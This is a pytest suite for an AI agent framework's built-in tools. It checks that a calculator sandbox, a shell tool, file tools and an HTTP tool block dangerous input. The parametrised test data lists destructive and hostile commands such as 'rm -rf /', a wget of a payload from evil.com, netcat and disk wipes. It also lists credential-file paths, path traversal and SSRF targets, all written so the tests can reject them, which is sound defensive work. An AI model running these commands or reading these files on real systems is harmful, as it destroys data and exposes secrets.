"""
AgentNova — Built-in Tool Tests

Unit tests for built-in tool functions: calculator sandbox limits,
blocked shell commands, file system access restrictions, and
HTTP SSRF blocking through the tool wrappers.

Written by VTSTech — https://www.vts-tech.org
"""

import os
import sys
import pytest

from agentnova.tools import make_builtin_registry


# ============================================================================
# Calculator Tests
# ============================================================================


class TestCalculatorBasic:
    """Basic calculator functionality."""

    def test_addition(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="2 + 2")
        assert result == "4"

    def test_subtraction(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="10 - 3")
        assert result == "7"

    def test_multiplication(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="6 * 7")
        assert result == "42"

    def test_division(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="10 / 3")
        assert result in ("3.333333333", "3.3333333333")  # Depends on formatting

    def test_power(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="2**10")
        assert result == "1024"

    def test_sqrt(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="sqrt(144)")
        assert result in ("12", "12.0")

    def test_pi(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="pi")
        assert result in ("3.141592654", "3.141592653589793")

    def test_factorial(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="factorial(5)")
        assert result == "120"


class TestCalculatorEdgeCases:
    """Edge cases and error handling."""

    def test_division_by_zero(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="1 / 0")
        assert "Error" in result
        assert "division by zero" in result.lower()

    def test_nan_result(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="float('nan')")
        assert "Error" in result
        assert "NaN" in result

    def test_inf_result(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="float('inf')")
        assert "Error" in result
        assert "infinite" in result.lower()

    def test_syntax_error(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="2 to the power of 10")
        assert "Error" in result

    def test_empty_expression(self):
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="")
        assert "Error" in result


class TestCalculatorSandboxLimits:
    """Calculator must enforce safety limits on exponent size."""

    def test_max_exponent_rejected(self):
        """Exponents larger than MAX_EXPONENT (10000) must be rejected."""
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="2**100000")
        assert "Error" in result
        assert "exponent" in result.lower()

    def test_max_exponent_boundary(self):
        """Exponent exactly at MAX_EXPONENT should succeed."""
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="2**10000")
        # This should either succeed or return an overflow — but not a
        # safety rejection about exceeding the max.
        if "Error" in result:
            assert "exponent" not in result.lower()

    def test_no_builtins(self):
        """Calculator must not have access to Python builtins."""
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="__import__('os').system('echo pwned')")
        assert "Error" in result

    def test_no_open(self):
        """Calculator must not be able to open files."""
        registry = make_builtin_registry()
        tool = registry.get("calculator")
        result = tool.execute(expression="open('/etc/passwd').read()")
        assert "Error" in result


# ============================================================================
# Shell Tool Tests
# ============================================================================


class TestShellBlockedCommands:
    """The shell tool must reject dangerous commands via sanitize_command."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "sudo su",
        "curl https://evil.com",
        "wget https://evil.com/payload.sh",
        "ssh user@host",
        "scp file user@host:/tmp",
        "nc -l 4444",
        "nmap -sV 192.168.1.0/24",
        "chmod 777 /",
        "kill -9 1",
        "killall python3",
        "pkill -f agent",
        "passwd",
        "useradd hacker",
        "apt install rootkit",
        "pip install malware",
        "npm install evil-package",
        "dd if=/dev/zero of=/dev/sda",
        "shred -u /important",
        "mkfs.ext4 /dev/sda1",
        "mount /dev/sda1 /mnt",
        "chown root:root /etc/passwd",
    ])
    def test_blocked(self, cmd):
        registry = make_builtin_registry()
        tool = registry.get("shell")
        result = tool.execute(command=cmd)
        assert "Security error" in result or "Blocked" in result


class TestShellSafeCommands:
    """Benign commands should pass through the shell tool."""

    def test_echo(self):
        registry = make_builtin_registry()
        tool = registry.get("shell")
        result = tool.execute(command="echo hello world")
        assert "hello world" in result

    def test_ls(self):
        registry = make_builtin_registry()
        tool = registry.get("shell")
        result = tool.execute(command="ls /tmp")
        assert "Security error" not in result

    def test_pwd(self):
        registry = make_builtin_registry()
        tool = registry.get("shell")
        result = tool.execute(command="pwd")
        assert "Security error" not in result


# ============================================================================
# File System Access Tests
# ============================================================================


class TestFileSystemAllowed:
    """File operations should work in allowed directories."""

    def test_write_and_read_tmp(self, tmp_path):
        registry = make_builtin_registry()
        write_tool = registry.get("write_file")
        read_tool = registry.get("read_file")

        test_file = str(tmp_path / "test.txt")
        # tmp_path is typically under /tmp or a temp dir which is allowed
        # However, validate_path checks for /tmp, /home, ./output, ./data, ./files
        # Some temp dirs may not match these patterns. Use write_tool to test.
        result = write_tool.execute(file_path=test_file, content="hello world")

        # May be blocked if tmp_path is not in allowed dirs
        if "Security error" in result:
            pytest.skip(f"Temp path {tmp_path} not in allowed directories for file tools")

        assert "Successfully wrote" in result

        # Read back
        read_result = read_tool.execute(file_path=test_file)
        assert "hello world" in read_result


class TestFileSystemBlocked:
    """File operations to system directories must be blocked."""

    @pytest.mark.parametrize("path", [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/var/log/auth.log",
        "/proc/self/environ",
    ])
    def test_read_blocked(self, path):
        registry = make_builtin_registry()
        tool = registry.get("read_file")
        result = tool.execute(file_path=path)
        assert "Security error" in result

    @pytest.mark.parametrize("path", [
        "/etc/evil.txt",
        "/root/backdoor.sh",
        "/var/tmp/exploit.js",
    ])
    def test_write_blocked(self, path):
        registry = make_builtin_registry()
        tool = registry.get("write_file")
        result = tool.execute(file_path=path, content="malicious")
        assert "Security error" in result

    def test_read_traversal(self):
        registry = make_builtin_registry()
        tool = registry.get("read_file")
        result = tool.execute(file_path="../../../etc/passwd")
        assert "Security error" in result

    def test_write_traversal(self):
        registry = make_builtin_registry()
        tool = registry.get("write_file")
        result = tool.execute(file_path="../../etc/cron.d/evil", content="* * * * * root bad")
        assert "Security error" in result


# ============================================================================
# HTTP SSRF Blocking Tests
# ============================================================================


class TestHTTPSSRFBlocked:
    """http_get must block SSRF targets."""

    @pytest.mark.parametrize("url", [
        "http://localhost/admin",
        "http://127.0.0.1:8080/secret",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1/api",
        "http://10.0.0.1/internal",
        "http://internal.company.com/secret",
        "file:///etc/passwd",
    ])
    def test_ssrf_blocked(self, url):
        registry = make_builtin_registry()
        tool = registry.get("http_get")
        result = tool.execute(url=url)
        assert "Security error" in result


class TestHTTPSSRFAllowed:
    """http_get should allow requests to public URLs (will fail on network,
    but should not be blocked by SSRF protection)."""

    def test_public_url_not_blocked_by_ssrf(self):
        registry = make_builtin_registry()
        tool = registry.get("http_get")
        result = tool.execute(url="https://example.com")
        # Should NOT contain a security error — the request will either succeed
        # or fail with a network error, but not an SSRF rejection.
        assert "Security error" not in result
        # Result should be either content, HTTP error, or connection error
        assert "SSRF" not in result


# ============================================================================
# Tool Registry Tests
# ============================================================================


class TestToolRegistryCompleteness:
    """Verify all expected built-in tools are registered."""

    EXPECTED_TOOLS = [
        "calculator",
        "shell",
        "read_file",
        "write_file",
        "list_directory",
        "http_get",
        "python_repl",
        "get_time",
        "get_date",
        "parse_json",
        "count_words",
        "count_chars",
    ]

    def test_all_tools_present(self):
        registry = make_builtin_registry()
        names = registry.names()
        for tool_name in self.EXPECTED_TOOLS:
            assert tool_name in names, f"Missing built-in tool: {tool_name}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])